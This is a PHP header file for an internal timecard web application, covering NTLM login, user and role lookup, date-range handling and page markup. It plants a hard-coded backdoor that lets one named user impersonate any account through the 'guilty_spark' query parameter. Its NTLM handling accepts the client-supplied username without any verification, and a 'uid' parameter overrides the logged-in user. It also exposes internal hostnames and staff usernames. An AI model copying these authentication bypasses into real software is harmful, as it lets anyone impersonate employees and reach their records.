<?php
// header.php
include_once('base.php');

set_the_cookies();

if (DEBUG) {
    $_SERVER["REMOTE_USER"] = "\\dnickles"; // "\\aj.ty"; // "\\aaliyah.harrison"; // "\\dnickles";
//	if(!isset($_SERVER["REMOTE_USER"]) || $_SERVER["REMOTE_USER"] == '') {
//		header('HTTP/1.1 401 Unauthorized');
//		header('WWW-Authenticate: Negotiate');
//		header('WWW-Authenticate: NTLM', false);
//		exit();
//	}
//
    $REMOTE_USER = explode("\\", $_SERVER["REMOTE_USER"]);
    logit('$REMOTE_USER = '.$REMOTE_USER[1]);
} else {
    $headers = apache_request_headers();
    if (!isset($headers['Authorization'])){
        header('HTTP/1.1 401 Unauthorized');
        header('WWW-Authenticate: NTLM');
        exit;
    }

    $auth = $headers['Authorization'];
    if (substr($auth,0,5) == 'NTLM ') {
        $msg = base64_decode(substr($auth, 5));
        if (substr($msg, 0, 8) != "NTLMSSP\x00") {
            die('error header not recognised');
        }

        if ($msg[8] == "\x01") {
            $msg2 = "NTLMSSP\x00\x02\x00\x00\x00".
                "\x00\x00\x00\x00". // target name len/alloc
                "\x00\x00\x00\x00". // target name offset
                "\x01\x02\x81\x00". // flags
                "\x00\x00\x00\x00\x00\x00\x00\x00". // challenge
                "\x00\x00\x00\x00\x00\x00\x00\x00". // context
                "\x00\x00\x00\x00\x00\x00\x00\x00"; // target info len/alloc/offset
            header('HTTP/1.1 401 Unauthorized');
            header('WWW-Authenticate: NTLM ' . trim(base64_encode($msg2)));
            exit;

        } else if ($msg[8] == "\x03") {
            function get_msg_str($msg, $start, $unicode = true) {
                $len = (ord($msg[$start+1]) * 256) + ord($msg[$start]);
                $off = (ord($msg[$start+5]) * 256) + ord($msg[$start+4]);
                if ($unicode) {
                    return str_replace("\0", '', substr($msg, $off, $len));
                } else {
                    return substr($msg, $off, $len);
                }
            }
            $username = strtolower(get_msg_str($msg, 36));
            $REMOTE_USER[1] = strtolower(get_msg_str($msg, 36));
            /* Kent
            print_r( $REMOTE_USER );
            $REMOTE_USER[1] = 'dkennedy';
            print_r( $REMOTE_USER );
             */

            //  $domain = strtolower(get_msg_str($msg, 28));
            //  $workstation = strtolower(get_msg_str($msg, 44));
            //  $logger->debug("NTLM authenticated: username=$username, domain=$domain, workstation=$workstation");
        }
    }
}

if($REMOTE_USER[1] == 'jcubic' && isset($_GET['guilty_spark'])) {
    $REMOTE_USER = array('jfab', $_GET['guilty_spark']); // backdoor for testing only
}

// "Now remember, this is only a temporary fix - unless it works." - Red Green

$current_time = time();
$user = json_decode(file_get_contents(request_json_api('/JSON/JSON_get_one_user_info.php?user_samaccountname='.$REMOTE_USER[1]), false, getContextCookies()), true);
if($user != null && count($user) < 1){
    unset($user);
    $json_add = json_decode(file_get_contents(request_json_api('/JSON/JSON_ACTION_add_user.php?user_samaccountname='.urlencode($REMOTE_USER[1])), false, getContextCookies()), true);
    if($json_add['success'] != true) {
        echo('<p style ="background-color:red;">ERROR: Unable to add user '.$REMOTE_USER[1]);
        echo('<br>');
        echo($json_add['error']);
        echo('</p>');
    }
    unset($json_add);
    $user = json_decode(file_get_contents(request_json_api('/JSON/JSON_get_one_user_info.php?user_samaccountname='.$REMOTE_USER[1]), false, getContextCookies()), true);
}

// check if admin or supervisor
//[{"user_group":"TCS Admin","config":{"systems": ["tcs"]},"users":["sstout", "ethan.zhao"],"update_time":"2023-10-09T16:39:42","update_user":"jiong.zhu","update_comment":null},
//{"user_group":"TCS Supervisor","config":{"systems": ["tcs"]},"users":["sstout", "ethan.zhao"],"update_time":"2023-10-09T16:39:50","update_user":"jiong.zhu","update_comment":null}]
//    echo($REMOTE_USER[1]);
//    echo('https://hydrogen.jfab.aosmd.com/rptp/api/get_authorization.php?user='.$REMOTE_USER[1]);
//
//https://hydrogen.jfab.aosmd.com/rptp/api/execute_api.php?api_id=authorization
$user_roles = json_decode(file_get_contents('https://hydrogen.jfab.aosmd.com/rptp/cache/authorization.json', false, getContextCookies()), true);
//    logit($user_roles);
//    $user_roles = json_decode(getHttpsContents('http://hydrogen.jfab.aosmd.com/rptp/api/get_authorization.php?user='.$REMOTE_USER[1]));
//    echo($user_roles);
$user['user_is_admin'] = false;
$user['user_is_supervisor'] = false;
if ($user_roles != null && count($user_roles) > 0) {
    foreach( $user_roles as $uk => $uv) {
        if ($uk == 'TCS Admin') {
            if (in_array($REMOTE_USER[1], $uv)) {
                $user['user_is_admin'] = true;
            }
        }
        if ($uk == 'TCS Supervisor') {
            if (in_array($REMOTE_USER[1], $uv)) {
                $user['user_is_supervisor'] = true;
            }
        }
    }
}

//	if($user['user_last_ldap_check']+(60*60*60*24) < ($current_time)) { // re-sync users with ldap every 24 hours when the individual user checks
//		$json_sync_user = json_decode(file_get_contents(request_json_api('/JSON/JSON_ACTION_ldap_sync_user.php?user_id='.$user['user_id']), false, getContextCookies()), true);
//		unset($json_sync_user);
//		unset($user);
//		$user = json_decode(file_get_contents(request_json_api('/JSON/JSON_get_one_user_info.php?user_samaccountname='.$REMOTE_USER[1]), false, getContextCookies()), true);
//	}

$currentUser  = $_GET['uid'] ?? $REMOTE_USER[1];
$currentMode  = $_GET['mode'] ?? 'balanced';
$currentRange = $_GET['quickRange'] ?? 'thisMonth';   // NEW
$currentStart = $_GET['start'] ?? date('Y-m-01');
$currentEnd   = $_GET['end'] ?? date('Y-m-d');

// Helper to build query URL
switch ($currentRange) {
    case 'thisWeek':
        $currentStart = date('Y-m-d', strtotime('monday this week'));
        $currentEnd   = date('Y-m-d');
        break;
    case 'lastWeek':
        $currentStart = date('Y-m-d', strtotime('monday last week'));
        $currentEnd   = date('Y-m-d', strtotime('sunday last week'));
        break;
    case 'thisMonth':
        $currentStart = date('Y-m-01');
        $currentEnd   = date('Y-m-d');
        break;
    case 'lastMonth':
        $currentStart = date('Y-m-01', strtotime('first day of last month'));
        $currentEnd   = date('Y-m-t', strtotime('last day of last month'));
        break;
    case 'thisQuarter':
        $quarter = ceil(date('n') / 3);
        $currentStart = date('Y-m-d', strtotime(date('Y').'-'.(($quarter-1)*3+1).'-01'));
        $currentEnd   = date('Y-m-d'); //date('Y-m-t', strtotime($thisQuarterStart));
        break;
    case 'lastQuarter':
        $quarter = ceil(date('n') / 3);
        $lastQuarter = $quarter - 1;
        if ($lastQuarter < 1) {
            $lastQuarter = 4;
            $lastQuarterYear = date('Y') - 1;
        } else {
            $lastQuarterYear = date('Y');
        }

        // Start of last quarter
        $currentStart = date('Y-m-d', strtotime($lastQuarterYear.'-'.(($lastQuarter-1)*3+1).'-01'));

        // End of last quarter: last day of the last month in that quarter
        $lastQuarterEndMonth = $lastQuarter * 3; // March, June, Sep, Dec
        $currentEnd = date('Y-m-t', strtotime($lastQuarterYear.'-'.$lastQuarterEndMonth.'-01'));
        break;
    case 'thisYear':
        $currentStart = date('Y-01-01');
        $currentEnd   = date('Y-m-d');
        break;
    case 'lastYear':
        $currentStart = date('Y-01-01', strtotime('last year'));
        $currentEnd   = date('Y-12-31', strtotime('last year'));
        break;
    case 'custom':
    default:
        // Respect user input if custom
        $currentStart = $_GET['start'] ?? date('Y-m-01');
        $currentEnd   = $_GET['end'] ?? date('Y-m-d');
        break;
}

$currentQueryUrl    = buildQueryUrl($mybaseurl.'/index.php?', $currentUser, $currentMode, $currentStart, $currentEnd, $currentRange); // default/current

//// Debug print
//    if (DEBUG) {
//        echo "<div style='padding:5px; background:#f0f0f0; border:1px solid #ccc;'>";
//        echo "DEBUG URL: <a href='$currentQueryUrl'>$currentQueryUrl</a><br>";
//        echo "GET Parameters: <pre>".htmlspecialchars(print_r($_GET,true))."</pre>";
//        echo "</div>";
//    }
?>

<!DOCTYPE html>
<html>
<head>
<title>My Timecard</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link href="css/bootstrap.min.css" rel="stylesheet"> <!-- Bootstrap (this must be before ie8 concessions) -->
<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!--[if lt IE 9]>
    <script src="js/html5shiv.js"></script>
    <script src="js/respond.min.js"></script>
<![endif]-->
<script src="js/jquery-1.10.2.min.js"></script> <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="js/bootstrap.min.js"></script>
<!-- Include all compiled plugins (below), or include individual files as needed -->
<link rel="stylesheet" href="css/theme.bootstrap.css"> <!-- tablesorter -->
<script src="js/jquery.tablesorter.js"></script> <!-- tablesorter -->
<script src="js/jquery.tablesorter.widgets.js"></script> <!-- tablesorter -->

<link rel="icon" type="image/png" href="./favicon.png">

<style type="text/css" media="print">
    a[href]:after {
        content:none;
    }
    .tablesorter-filter-row { display:none; }
    .container {
        margin: 0;
        padding: 0;
    }
</style>

<script type="text/javascript">
    // function callback_switchDB() {
    //     document.getElementById("id_db_type").innerHTML = tips;
    //     // $('#id_db_type').innerHTML = tips;
    // }

    // function switchDB(msg, callback) {
    function switchDB() {
        const jsVar = "<?php echo $GLOBALS['DB_TYPE']; ?>";
        let tips = '';
        if (jsVar == 'pgsql')
        {
            tips = 'mysql';
        } else {
            tips = 'pgsql';
        }
        const reply = confirm("Do you want to switch the DB to " + tips.toUpperCase() + " ? ");
        if (reply) {
            document.getElementById("id_db_type").innerHTML = tips.toUpperCase();
            document.cookie = 'DB_TYPE=' + tips;
        }
    }

    function certValidateDelete(){
        let confirmMsg;
        //alert($('#delete_cert').val());
        if ($('#delete_cert').val() < 1) {
            confirmMsg = "Disable this Certificate?";
        } else {
            confirmMsg = "Reactivate this Certificate?";
        }
        return confirm(confirmMsg);
    }

    $.tablesorter.addParser({
        // set a unique id
        id: 'ignore_labels',
        is: function(s) {
            // return false so this parser is not auto detected
            return false;
        },
        format: function(s) {
            return(s.split('||||')[0].toUpperCase());
        },
        // set type, either numeric or text
        type: 'text'
    });

    $(document).ready(function() {
        $.extend($.tablesorter.themes.bootstrap, {
            // these classes are added to the table. To see other table classes available,
            // look here: http://twitter.github.com/bootstrap/base-css.html#tables
            table      : 'table table-bordered table-striped',
            header     : 'bootstrap-header', // give the header a gradient background
            footerRow  : '',
            footerCells: '',
            icons      : '', // add "icon-white" to make them white; this icon class is added to the <i> in the header
            sortNone   : 'glyphicon glyphicon-sort',
            sortAsc    : 'glyphicon glyphicon-sort-by-attributes',
            sortDesc   : 'glyphicon glyphicon-sort-by-attributes-alt',
            // sortNone   : 'bootstrap-icon-unsorted',
            // sortAsc    : 'glyphicon glyphicon-chevron-up',
            // sortDesc   : 'glyphicon glyphicon-chevron-down',
            active     : '', // applied when column is sorted
            hover      : '', // use custom css here - bootstrap class may not override it
            filterRow  : '', // filter row class
            even       : '', // odd row zebra striping
            odd        : ''  // even row zebra striping
        });

        $(".tablesorter").tablesorter({
            // this will apply the bootstrap theme if "uitheme" widget is included
            // the widgetOptions.uitheme is no longer required to be set
            theme : "bootstrap",

            widthFixed: true,

            headerTemplate : '{content} {icon}', // new in v2.7. Needed to add the bootstrap icon!

            // widget code contained in the jquery.tablesorter.widgets.js file
            // use the zebra stripe widget if you plan on hiding any rows (filter widget)
            widgets : [ "uitheme", "filter" ],

            widgetOptions : {
                // using the default zebra striping class name, so it actually isn't included in the theme variable above
                // this is ONLY needed for bootstrap theming if you are using the filter widget, because rows are hidden
                // zebra : ["even", "odd"],

                // reset filters button
                filter_reset : ".reset"

                // set the uitheme widget to use the bootstrap theme class names
                // this is no longer required, if theme is set
                // ,uitheme : "bootstrap"

            }
        });

        // filter button demo code
        $('button.filter').click(function(){
            var col = $(this).data('column'),
                txt = $(this).data('filter');
            $('table').find('.tablesorter-filter').val('').eq(col).val(txt);
            $('table').trigger('search', false);
            return false;
        });
    });

    function saveToExcel() {
        $('#dataToDisplay').val($('#jfabtable').html());
        document.getElementById('savetoexcelform').submit();
        return false; // stop link navigation
    }
</script>

<link type="text/css" href="css/redmond/jquery-ui-1.9.2.custom.min.css" rel="stylesheet"> <!-- used only for datepicker -->
<script type="text/javascript" src="js/jquery-ui-1.9.2.custom.min.js"></script> <!-- used only for datepicker -->

<link type="text/css" href="css/my.css" rel="stylesheet">
<script type="text/javascript" src="js/my.js"></script>
</head>
<body>
<?php if (DEBUG): ?>
<div class="watermark-text">FOR TESTING ONLY!</div>
<?php endif; ?>
<?php include('navbar.php'); ?>
<?php include('toolbar.php'); ?>

<div class="container">
<hr style="border-top: 1px dotted lightgrey; background: none; height: 0; margin-top:5px; margin-bottom:10px;">